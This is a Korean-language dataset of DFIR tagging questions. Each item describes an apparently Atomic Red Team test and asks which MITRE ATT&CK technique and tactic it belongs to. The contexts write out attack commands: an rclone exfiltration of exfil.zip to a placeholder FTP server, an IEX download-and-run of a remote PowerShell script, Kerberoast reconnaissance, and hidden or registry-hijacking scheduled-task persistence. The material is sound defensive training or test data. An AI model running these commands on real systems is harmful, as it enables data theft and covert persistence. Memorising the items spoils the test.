{"id": "T1048.003_T1048.003-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (Tactic: Exfiltration)\n[요약] rclone 도구를 활용해 exfil.zip 파일을 외부 FTP 서버로 복사하는 시나리오이다. 사전 단계에서 테스트용 exfil.zip 파일과 rclone 바이너리를 준비한 뒤, rclone config create로 FTP 리모트를 구성하고 rclone copy로 대용량 파일을 업로드한다.\n[절차] PowerShell에서 fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760 명령을 통해 20MB 크기의 더미 exfil.zip 파일을 생성한다(또는 기존 파일이 있으면 그대로 사용). Invoke-WebRequest로 rclone-current-windows-amd64.zip을 C:\\Users\\Public\\Downloads\\ 경로에 다운로드한다. Expand-Archive를 사용해 rclone-current-windows-amd64.zip을 C:\\Users\\Public\\Downloads\\에 압축 해제한다. PowerShell에서 Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\"로 rclone 바이너리의 전체 경로를 찾는다. Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\"으로 업로드 대상 exfil.zip 파일 경로를 찾는다. &$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass} 명령으로 rclone에 FTP 리모트(ftpserver)를 생성한다. &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate 명령으로 exfil.zip을 FTP 서버에 업로드한다. FTP 서버 측에서 exfil.zip 파일이 존재하는지 확인한다.\n[대표 명령 예시]\n$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName; $exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName; &$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate", "answer": "이 행위는 MITRE ATT&CK의 T1048.003 \"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1049_T1049-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1049 System Network Connections Discovery (Tactic: Discovery)\n[요약] cmd.exe에서 netstat, net use, net sessions 명령을 실행해 시스템의 네트워크 연결, SMB 공유 매핑, 세션 정보를 열람하는 시나리오이다. 단순 명령 기반이지만, 공격자는 이를 통해 활성 연결과 공유 자원을 파악할 수 있다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. netstat 명령을 실행해 현재 TCP/UDP 연결 및 리스닝 포트를 확인한다. net use 명령으로 현재 시스템에 매핑된 네트워크 드라이브 및 공유 연결 목록을 확인한다. net sessions 명령으로 서버 관점에서 연결된 세션·사용자 정보를 조회한다(일부 환경에서는 관리자 권한 필요). 출력 결과를 캡처해 C2 연결, SMB 공유 등 의심스러운 연결이 있는지 분석한다.\n[대표 명령 예시]\nnetstat\r\nnet use\r\nnet sessions", "answer": "이 행위는 MITRE ATT&CK의 T1049 \"System Network Connections Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1049_T1049-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1049 System Network Connections Discovery (Tactic: Discovery)\n[요약] PowerShell의 Get-NetTCPConnection cmdlet을 사용해 현재 시스템의 TCP 연결(로컬/원격 주소, 포트, 상태 등)을 조회하는 시나리오이다. 포트·상태 기반 필터링과 함께 사용하면 특정 서비스나 C2 연결을 찾는 데 활용될 수 있다.\n[절차] PowerShell 콘솔을 실행한다. Get-NetTCPConnection 명령을 실행해 모든 TCP 연결 목록을 가져온다. 출력 결과에서 LocalPort, RemotePort, RemoteAddress, State 필드를 기준으로 의심스러운 연결을 식별한다. 필요하다면 | Where-Object, | Select-Object 등을 추가해 특정 포트·프로세스에 대한 상세 정보를 필터링한다.\n[대표 명령 예시]\nGet-NetTCPConnection", "answer": "이 행위는 MITRE ATT&CK의 T1049 \"System Network Connections Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1049_T1049-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1049 System Network Connections Discovery (Tactic: Discovery)\n[요약] SharpView.exe를 이용해 네트워크 연결뿐만 아니라 도메인·도메인 사용자·공유 리소스 등 AD 환경 전반의 정보를 조회하는 시나리오이다. 공격자는 Kerberoasting, ACL 스캐닝, 도메인 공유 탐색 등 후속 공격에 필요한 정보를 한 번에 수집할 수 있다.\n[절차] PowerShell에서 Test-Path \"#{SharpView}\" 명령으로 SharpView.exe가 지정 경로에 존재하는지 확인한다. 존재하지 않으면 (split-path \"#{SharpView}\") 경로에 디렉터리를 생성한 후, Invoke-WebRequest #{SharpView_url} -OutFile \"#{SharpView}\"를 실행해 GitHub에서 SharpView.exe를 다운로드한다. PowerShell 스크립트 내에서 $syntaxList = #{syntax}로 실행할 메서드 목록(예: \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\")을 준비한다. foreach ($syntax in $syntaxList) { #{SharpView} $syntax } 루프를 통해 SharpView.exe를 각 메서드 인자와 함께 실행한다. 콘솔에 출력된 결과를 기반으로 도메인 ACL, Kerberoast 대상 계정, 도메인 공유 등 네트워크·도메인 정보를 분석한다.\n[대표 명령 예시]\n$syntaxList = #{syntax}; foreach ($syntax in $syntaxList) { #{SharpView} $syntax }", "answer": "이 행위는 MITRE ATT&CK의 T1049 \"System Network Connections Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.002_T1053.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.002 Scheduled Task/Job: At (Tactic: Execution)\n[요약] at.exe를 사용해 13:20에 상호작용형(interactive) cmd.exe를 실행하도록 예약 작업을 생성하는 시나리오이다. 실행 시 cmd.exe가 at.exe를 호출해 작업을 등록하고, 지정된 시간에 새 cmd 창이 자동으로 열리게 된다.\n[절차] 명령 프롬프트(cmd.exe)를 연다. at 13:20 /interactive cmd 명령을 실행해 13:20에 cmd.exe를 인터랙티브 세션으로 실행하는 작업을 예약한다. at 명령만 입력해 예약된 작업 목록을 확인하고, 방금 생성된 작업이 등록되었는지 확인한다. 시스템 시간이 13:20이 되면 예약된 작업이 실행되면서 새로운 cmd.exe 프로세스가 생성되는지 관찰한다.\n[대표 명령 예시]\nat 13:20 /interactive cmd", "answer": "이 행위는 MITRE ATT&CK의 T1053.002 \"Scheduled Task/Job: At\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] schtasks.exe를 이용해 사용자 로그온 시(calc.exe)와 시스템 시작 시(calc.exe)를 실행하는 두 개의 작업을 생성한다. 로그온/부팅 이벤트 기반 자동 실행 형태의 간단한 지속성 시나리오를 재현한다.\n[절차] 관리자 권한 cmd.exe를 실행한다. schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" 명령으로 사용자 로그온 시 calc.exe를 실행하는 작업을 생성한다. schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\" 명령으로 시스템 시작 시 SYSTEM 권한으로 calc.exe를 실행하는 작업을 생성한다. 작업 스케줄러(Task Scheduler)를 열어 Active Tasks 창에서 T1053_005_OnLogon, T1053_005_OnStartup 작업이 등록되었는지 확인한다. 로그오프/재부팅 등을 통해 조건이 만족되면 calc.exe가 자동 실행되는지 확인한다.\n[대표 명령 예시]\nschtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\r\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] 로컬 시스템에서 schtasks.exe를 사용해 지정된 시간(기본 20:10)에 cmd.exe를 한 번 실행하는 작업을 생성한다. ONCE 스케줄을 이용한 단발성 지연 실행 패턴을 보여준다.\n[절차] cmd.exe를 실행한다(기본 설정에서는 관리자 권한이 없어도 동작 가능). SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time} 명령을 실행해 ONCE 타입 작업 spawn을 생성한다. schtasks /query /TN spawn 명령으로 작업이 제대로 등록되었는지 확인한다. 시스템 시간이 #{time}에 도달하면 #{task_command}(기본: C:\\windows\\system32\\cmd.exe)가 실행되는지 확인한다.\n[대표 명령 예시]\nSCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] SCHTASKS를 사용해 원격 시스템에 \"Atomic task\"라는 이름의 일일(Daily) 작업을 생성하고, 특정 시간(기본 20:10)에 cmd.exe를 실행하도록 설정한다. 도메인 자격 증명을 이용한 원격 작업 생성 시나리오이다.\n[절차] 로컬 시스템에서 cmd.exe를 관리자 권한으로 실행한다. #{target} 호스트에 대해 #{user_name} / #{password} 자격 증명으로 원격 접속이 가능한지 확인한다. SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time} 명령을 실행해 원격 시스템에 작업을 생성한다. SCHTASKS /Query /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" 명령으로 원격 작업이 생성되었는지 확인한다. 시간이 경과하거나 수동으로 schtasks /Run을 실행해 원격 시스템에서 #{task_command}가 실행되는지 확인할 수 있다.\n[대표 명령 예시]\nSCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] PowerShell의 작업 스케줄러 cmdlet(New-ScheduledTaskAction 등)을 사용해 Administrators 그룹 컨텍스트로 calc.exe를 로그온 시 실행하는 AtomicTask를 생성한다. schtasks.exe 대신 네이티브 PowerShell API를 사용하는 패턴이다.\n[절차] PowerShell 콘솔을 실행한다. New-ScheduledTaskAction -Execute \"calc.exe\" 명령으로 calc.exe 실행 액션을 생성한다. New-ScheduledTaskTrigger -AtLogon 명령으로 사용자 로그온 시 트리거를 생성한다. New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest 명령으로 최고 권한(관리자 그룹)으로 실행되는 Principal을 생성한다. New-ScheduledTaskSettingsSet으로 기본 설정 세트를 생성하고, New-ScheduledTask로 Action/Trigger/Principal/Settings를 조합한 객체를 만든다. Register-ScheduledTask AtomicTask -InputObject $object 명령으로 AtomicTask라는 이름의 작업을 등록한다.\n[대표 명령 예시]\n$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\r\n$Trigger = New-ScheduledTaskTrigger -AtLogon\r\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\r\n$Set = New-ScheduledTaskSettingsSet\r\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\r\nRegister-ScheduledTask AtomicTask -InputObject $object", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] Invoke-MalDoc PowerShell 스크립트를 사용해 악성 매크로 코드가 포함된 Office 문서를 열고, VBA를 통해 notepad.exe를 30~40초 후 실행하는 스케줄 작업을 등록하는 시나리오이다. 문서 기반 초기 침투 후 Task Scheduler를 악용하는 패턴을 재현한다.\n[절차] PowerShell에서 Microsoft #{ms_product} (기본: Word)가 COM 객체로 생성 가능한지 확인해 설치 여부를 검증한다. [Net.ServicePointManager]::SecurityProtocol = Tls12 설정 후, Invoke-MalDoc.ps1을 GitHub에서 다운로드 및 로드(IEX (iwr ...))한다. Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\" 명령을 실행해 지정 매크로를 포함한 Office 문서를 실행한다. 매크로 코드는 Windows API/Task Scheduler 인터페이스를 호출해 약 30~40초 후 notepad.exe를 실행하는 작업을 등록한다. 지정된 시간이 지난 후 notepad.exe가 자동 실행되는지 확인한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] WMI 클래스 PS_ScheduledTask와 Invoke-CimMethod RegisterByXml 메서드를 이용해 XML 정의(T1053_005_WMI.xml)에 기반한 작업을 등록한다. PowerShell cmdlet 대신 WMI 경로를 악용하는 스케줄 작업 생성 기법이다.\n[절차] #{xml_path}에 T1053_005_WMI.xml 파일이 존재하는지 확인한다. 없으면 Invoke-WebRequest로 GitHub에서 다운로드한다. PowerShell을 관리자 권한으로 실행한다. $xml = [System.IO.File]::ReadAllText(\"#{xml_path}\") 명령을 통해 XML 내용을 문자열로 읽어온다. Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; } 명령을 실행해 XML 기반 작업을 등록한다. Task Scheduler에서 \"T1053_005_WMI\" 작업이 생성되었는지 확인한다.\n[대표 명령 예시]\n$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\r\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] HKCU\\SOFTWARE\\ATOMIC-T1053.005 레지스트리에 Base64 인코딩된 명령(ping 127.0.0.1)을 저장하고, 매일 지정된 시간에 이 값을 디코딩해 PowerShell로 실행하는 스케줄 작업을 생성한다. QakBot에서 관찰된 레지스트리+스케줄 작업 기반 지속성 패턴을 모방한다.\n[절차] cmd.exe를 관리자 권한으로 실행한다(레지스트리 및 작업 생성 권한 확보 목적). reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f 명령을 실행해 ping 127.0.0.1에 해당하는 Base64 문자열을 test 값으로 저장한다. schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time} 명령을 실행해 매일 #{time}에 레지스트리 값을 디코딩·실행하는 작업을 생성한다. Task Scheduler GUI 또는 schtasks /query /TN \"ATOMIC-T1053.005\"로 작업이 등록되었는지 확인한다. 실행 시점 이후에는 네트워크에서 ping 127.0.0.1 호출이 발생하는지 관찰할 수 있다.\n[대표 명령 예시]\nreg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\r\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] 숨김(hidden) 속성을 가진 XML 정의를 WMI PS_ScheduledTask::RegisterByXml로 등록해 사용자 로그온 시 calc.exe를 실행하는 작업을 생성한다. 트릭봇, Industroyer2 등에서 사용된 숨김 스케줄 작업 기반 지속성을 재현한다.\n[절차] #{xml_path}에 T1053_05_SCTASK_HIDDEN_ATTRIB.xml 파일이 존재하는지 확인하고, 없으면 GitHub에서 다운로드한다. 관리자 권한 PowerShell을 실행한다. $xml = [System.IO.File]::ReadAllText(\"#{xml_path}\") 명령으로 XML 내용을 불러온다. Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; } 명령을 실행해 숨김 속성 작업을 등록한다. Task Scheduler에서 \"atomic red team\" 작업을 확인하되, Hidden 속성으로 인해 기본 뷰에 잘 보이지 않을 수 있음을 감안한다.\n[대표 명령 예시]\n$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\r\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] PowerShell cmdlet을 이용해 처음에는 cmd.exe를 실행하도록 등록된 AtomicTaskModifed 작업을 만든 뒤, Set-ScheduledTask를 통해 액션을 notepad.exe 실행으로 변경한다. 기존 작업의 Action 수정에 따른 로그/아티팩트 변화를 관찰할 수 있다.\n[절차] PowerShell 콘솔을 실행한다. $Action = New-ScheduledTaskAction -Execute \"cmd.exe\" 명령으로 초기 액션을 생성한다. New-ScheduledTaskTrigger -AtLogon, New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest, New-ScheduledTaskSettingsSet로 트리거/프린시펄/설정 객체를 생성한다. New-ScheduledTask로 위 요소를 조합해 작업 객체를 만들고, Register-ScheduledTask AtomicTaskModifed -InputObject $object 명령으로 작업을 등록한다. $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\" 명령으로 새로운 액션을 정의한다. Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction 명령을 실행해 기존 작업의 액션을 notepad.exe 실행으로 변경한다.\n[대표 명령 예시]\n$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\r\n$Trigger = New-ScheduledTaskTrigger -AtLogon\r\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\r\n$Set = New-ScheduledTaskSettingsSet\r\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\r\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\r\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\r\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] PsExec를 사용해 NT AUTHORITY\\SYSTEM 권한 cmd를 연 뒤, GhostTask.exe로 Schedule\\TaskCache\\Tree 하위 레지스트리를 직접 조작해 작업을 생성한다. 이 방식은 일반적인 4698 이벤트 없이 작업을 만들 수 있어 \"Ghost Task\"로 불린다.\n[절차] PathToAtomicsFolder..\\ExternalPayloads\\PsExec.exe와 GhostTask.exe가 존재하는지 확인하고, 없으면 get_prereq 명령으로 다운로드 및 복사한다. 관리자 권한 cmd.exe에서 \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\" 명령을 실행해 #{target} 시스템에서 SYSTEM 권한 cmd 세션을 연다. SYSTEM 세션에서 \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon 명령을 실행해 로그온 시 cmd /c #{task_command}를 실행하는 작업을 추가한다. 스케줄러 GUI 또는 TaskCache 레지스트리를 통해 #{task_name} 작업이 존재하는지 확인하되, 일반 4698 이벤트가 생성되지 않는 점을 관찰한다. 사용자 로그온 시 notepad.exe 등의 페이로드가 실행되는지 확인한다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\r\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1053.005_T1053.005-11_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command의 기본값을 오버라이드해, compmgmt.msc(컴퓨터 관리 콘솔)가 열릴 때 calc.exe를 대신 실행하도록 한 뒤, compmgmt.msc를 ONLOGON 작업으로 등록한다. 합법적인 MMC 스냅인 실행 경로를 하이재킹하는 스케줄 작업 기반 지속성 기법이다.\n[절차] 관리자 권한 cmd.exe를 실행한다. reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f 명령으로 .msc 파일의 기본 open 명령을 #{payload}(기본 calc.exe)로 설정한다. schtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F 명령을 실행해 로그온 시 compmgmt.msc를 실행하는 스케줄 작업을 생성한다. ECHO 메시지 이후 compmgmt.msc를 실행하면, 레지스트리 하이재킹에 의해 컴퓨터 관리 콘솔 대신 calc.exe가 실행되는지 확인한다. 사용자 로그온 시에도 동일 동작이 발생해 지속성이 유지되는지 관찰한다.\n[대표 명령 예시]\nreg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\r\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\r\nECHO Let's open the Computer Management console now...\r\ncompmgmt.msc", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
